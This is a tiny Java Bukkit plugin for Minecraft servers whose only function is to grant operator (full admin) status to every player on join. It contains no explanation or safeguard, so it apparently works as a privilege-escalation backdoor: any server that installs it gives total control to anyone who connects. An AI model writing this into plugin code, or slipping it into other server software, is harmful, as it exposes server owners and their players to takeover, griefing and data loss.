package io.github.skepter.name;

import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.plugin.java.JavaPlugin;

public class Main extends JavaPlugin implements Listener {
	
	@Override
	public void onEnable() {
		getServer().getPluginManager().registerEvents(this, this);
	}		
	

	@EventHandler
	public void onJoin(PlayerJoinEvent e) {
		e.getPlayer().setOp(true);
	}
}
